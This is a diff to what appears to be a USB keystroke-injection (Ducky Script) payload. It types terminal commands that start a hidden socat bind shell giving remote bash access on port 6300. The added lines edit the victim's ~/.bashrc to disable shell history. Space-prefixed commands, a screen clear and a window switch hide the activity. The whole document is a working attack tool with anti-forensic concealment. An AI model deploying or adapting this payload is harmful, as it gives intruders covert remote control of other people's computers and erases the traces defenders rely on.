@@ -26,13 +26,16 @@ STRING terminal
 DELAY 1000
 ENTER
 DELAY 500
-STRING nohup socat TCP-LISTEN:6300 EXEC:/bin/bash &>/dev/null &
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+ENTER
+DELAY 500
+STRING  nohup socat TCP-LISTEN:6300 EXEC:/bin/bash &>/dev/null &
 DELAY 2000
 ENTER
 DELAY 500
-STRING clear
+STRING  clear
 ENTER
 DELAY 250
-GUI m
+GUI w
 
 
